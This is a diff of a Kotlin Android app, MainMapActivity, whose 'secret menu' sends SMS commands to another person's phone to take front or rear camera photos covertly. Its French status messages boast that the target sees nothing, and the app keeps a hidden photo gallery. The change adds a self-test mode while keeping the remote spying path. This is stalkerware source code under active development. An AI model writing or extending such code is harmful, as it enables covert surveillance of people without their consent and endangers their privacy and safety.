@@ -74,7 +74,6 @@ class MainMapActivity : AppCompatActivity() {
         initGPS()
         initButtons()
         
-        // ✅ Demander TOUTES les permissions D'ABORD
         if (!hasAllPermissions()) {
             showPermissionExplanation()
         } else {
@@ -277,9 +276,12 @@ class MainMapActivity : AppCompatActivity() {
     private fun showSecretMenu() {
         val otherNum = getOtherNumber() ?: return
         
+        val isSelf = isMyNumber(otherNum)
+        val selfSuffix = if (isSelf) " (TEST — MOI-MÊME)" else ""
+        
         val options = arrayOf(
-            "📸 Prendre photo AVANT à distance",
-            "📸 Prendre photo ARRIÈRE à distance",
+            "📸 Prendre photo AVANT$selfSuffix",
+            "📸 Prendre photo ARRIÈRE$selfSuffix",
             "🖼️ Galerie cachée des photos",
             "❌ Fermer le menu"
         )
@@ -290,18 +292,32 @@ class MainMapActivity : AppCompatActivity() {
                 when (which) {
                     0 -> {
                         if (checkCameraPermission()) {
-                            sendSms(otherNum, Commands.REQUEST_PHOTO_FRONT)
-                            tvStatus.text = "📸 Demande photo AVANT envoyée à $otherNum — Invisible pour lui !"
-                            Toast.makeText(this, "📸 Photo avant demandée — Il ne voit rien !", Toast.LENGTH_LONG).show()
+                            if (isSelf) {
+                                // ✅ MODE TEST : prendre photo DIRECTEMENT
+                                tvStatus.text = "🧪 MODE TEST — Photo AVANT demandée à MOI-MÊME !"
+                                Toast.makeText(this, "📸 Prise de vue caméra AVANT...", Toast.LENGTH_LONG).show()
+                                CameraCaptureService.takePhoto(this, useFront = true)
+                            } else {
+                                sendSms(otherNum, Commands.REQUEST_PHOTO_FRONT)
+                                tvStatus.text = "📸 Demande photo AVANT envoyée à $otherNum — Invisible pour lui !"
+                                Toast.makeText(this, "📸 Photo avant demandée — Il ne voit rien !", Toast.LENGTH_LONG).show()
+                            }
                         } else {
                             requestCameraPermission()
                         }
                     }
                     1 -> {
                         if (checkCameraPermission()) {
-                            sendSms(otherNum, Commands.REQUEST_PHOTO_BACK)
-                            tvStatus.text = "📸 Demande photo ARRIÈRE envoyée à $otherNum — Invisible pour lui !"
-                            Toast.makeText(this, "📸 Photo arrière demandée — Il ne voit rien !", Toast.LENGTH_LONG).show()
+                            if (isSelf) {
+                                // ✅ MODE TEST : prendre photo DIRECTEMENT
+                                tvStatus.text = "🧪 MODE TEST — Photo ARRIÈRE demandée à MOI-MÊME !"
+                                Toast.makeText(this, "📸 Prise de vue caméra ARRIÈRE...", Toast.LENGTH_LONG).show()
+                                CameraCaptureService.takePhoto(this, useFront = false)
+                            } else {
+                                sendSms(otherNum, Commands.REQUEST_PHOTO_BACK)
+                                tvStatus.text = "📸 Demande photo ARRIÈRE envoyée à $otherNum — Invisible pour lui !"
+                                Toast.makeText(this, "📸 Photo arrière demandée — Il ne voit rien !", Toast.LENGTH_LONG).show()
+                            }
                         } else {
                             requestCameraPermission()
                         }
